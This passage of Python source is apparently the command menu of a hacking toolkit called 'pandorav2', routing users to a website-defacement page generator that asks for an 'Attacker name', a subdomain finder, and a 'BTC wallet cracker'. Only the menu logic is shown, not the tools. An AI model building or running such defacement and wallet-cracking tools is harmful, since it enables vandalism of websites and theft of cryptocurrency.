                            height = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo height {colors['first']}--> ")
                            grts = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Greets {colors['first']}--> ")
                            file_name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Save as {colors['first']}--> ")
                            tools.deface_html.sc2(name, msg, music, logo, width, height, grts, file_name)
                        elif pilihan.lower() == '3':
                            name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Attacker name {colors['first']}--> ")
                            msg = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Message {colors['first']}--> ")
                            logo = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Logo URL (round logo only!){colors['first']}--> ")
                            file_name = input(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] Save as {colors['first']}--> ")
                            tools.deface_html.sc3(name, msg, logo, file_name)
                        else:
                            print(f"{colors['second']}[{colors['first']}DefaceHTML{colors['second']}] {colors['first']}Unknown deface option, only 1 and 2 (please wait for the next update!)")
                    except KeyboardInterrupt:
                        print("\nExiting..")
                        break
            elif prompts.lower() == 'menu' or prompts.lower() == 'menu1':
                print(banner.menu())
            elif prompts.lower() == 'menu2':
                print(banner.menu2())
            elif prompts.lower() == 'bigthanks':
                tools.show()
        elif now_path == 'menu2':
            if prompts.lower() == '1' or prompts.lower() == 'subdo git' or prompts.lower() == 'subdogit':
                tools.subdo_git()
            elif prompts.lower() == '2' or prompts.lower() == 'btcwalletcracker' or prompts.lower() == 'btc wallet cracker':
                tools.btc_wallet_cracker()
            elif prompts.lower() == 'menu' or prompts.lower() == 'menu1':
                print(banner.menu())
            elif prompts.lower() == 'menu2':
                print(banner.menu2())
            elif prompts.lower() == 'changeusername':
                user_new = input("[+] New Username: ")
                if user_new:
                    with open('__system.file__/USER_/user.log', 'w') as file:
                        file.write(str(user_new)+'\r')
                    print('\n')
                else:
                    print("Please Fill\n")
                    pass
            elif prompts.lower() == 'menu' or prompts.lower() == 'menu1':
                print(banner.menu())
            elif prompts.lower() == 'menu2':
                print(banner.menu2())
            elif prompts.lower() == 'help':
                print(banner.help())
            elif prompts.lower() == 'changecolor':
                c = input('\n[+] Color [Available: Red_Yng, Cyan_Yng, Gold_Yng, Green_Yng]: ')
                if c.lower() == 'cyan_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'cyan'
                elif c.lower() == 'gold_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'gold'
                elif c.lower() == 'red_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'dark_red'
                elif c.lower() == 'green_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'green'
                else:
                    is_secondcolor = 'white'
                    is_firstcolor = 'white'

                output_string = 'is_default=444 | is_secondcolor={} | is_firstcolor={}'.format(is_secondcolor, is_firstcolor)
                with open('__system.file__/LOG_/default_color.log', 'w') as file:
                    file.write(str(output_string)+'\r')
                os.system('python3 pandorav2.py')
            elif prompts.lower() == 'cls' or prompts.lower() == 'clear':
                print(banner.logo())
            elif prompts.lower() == 'bigthanks':
                tools.show()
        else:
            if prompts.lower() == 'changeusername':
                user_new = input("[+] New Username: ")
                if user_new:
                    with open('__system.file__/USER_/user.log', 'w') as file:
                        file.write(str(user_new)+'\r')
                    print('\n')
                else:
                    print("Please Fill\n")
                    pass
            elif prompts.lower() == 'menu' or prompts.lower() == 'menu1':
                print(banner.menu())
            elif prompts.lower() == 'menu2':
                print(banner.menu2())
            elif prompts.lower() == 'help':
                print(banner.help())
            elif prompts.lower() == 'changecolor':
                c = input('\n[+] Color [Available: Red_Yng, Cyan_Yng, Gold_Yng, Green_Yng]: ')
                if c.lower() == 'cyan_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'cyan'
                elif c.lower() == 'gold_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'gold'
                elif c.lower() == 'red_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'dark_red'
                elif c.lower() == 'green_yng':
                    is_secondcolor = 'white'
                    is_firstcolor = 'green'
                else:
                    is_secondcolor = 'white'
                    is_firstcolor = 'white'

                output_string = 'is_default=444 | is_secondcolor={} | is_firstcolor={}'.format(is_secondcolor, is_firstcolor)
                with open('__system.file__/LOG_/default_color.log', 'w') as file:
                    file.write(str(output_string)+'\r')
                os.system('python3 pandorav2.py')
            elif prompts.lower() == 'cls' or prompts.lower() == 'clear':
                print(banner.logo())
            elif prompts.lower() == 'bigthanks':
                tools.show()
if __name__ == '__main__':
    try:
        if not exists('__system.file__/LOG_/dir.log'):
            print("[%] Checking file & folder..")
            login.check_folder()
        else:
            with open('__system.file__/LOG_/dir.log', 'r') as file:
                result = file.readline().strip()
            if 'verified' in result:
                pass
            else:
                login.check_folder()
        if not exists('__system.file__/LOG_/ssl.log'):
            print("[%] Checking openssl module..")
            login.check_openssl()
        else:
            with open('__system.file__/LOG_/ssl.log', 'r') as file:
                result = file.readline().strip()
            if 'verified' in result:
                pass
            else:
                login.check_openssl()
    finally:
        __MAIN__()

